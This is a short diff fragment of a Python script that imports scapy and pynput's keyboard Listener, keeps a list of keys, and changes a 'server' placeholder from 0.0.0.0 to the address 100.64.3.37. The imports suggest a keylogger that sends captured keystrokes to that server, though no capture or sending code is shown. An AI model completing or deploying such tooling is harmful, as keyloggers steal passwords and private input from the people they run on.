@@ -6,7 +6,7 @@ from scapy.all import *
 
 from pynput.keyboard import Key, Listener # type: ignore
 
-server = "0.0.0.0" #place holder
+server = "100.64.3.37" #place holder
 
 keys = []
 
